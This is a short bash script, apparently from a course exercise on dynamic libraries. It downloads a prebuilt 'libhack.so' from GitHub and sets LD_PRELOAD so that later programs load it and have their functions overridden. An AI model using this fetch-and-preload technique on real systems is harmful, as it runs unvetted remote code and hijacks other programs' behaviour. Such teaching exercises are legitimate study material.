#!/bin/bash
wget -P .. https://raw.githubusercontent.com/Marinus12/alx-low_level_programming/master/0x18-dynamics_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
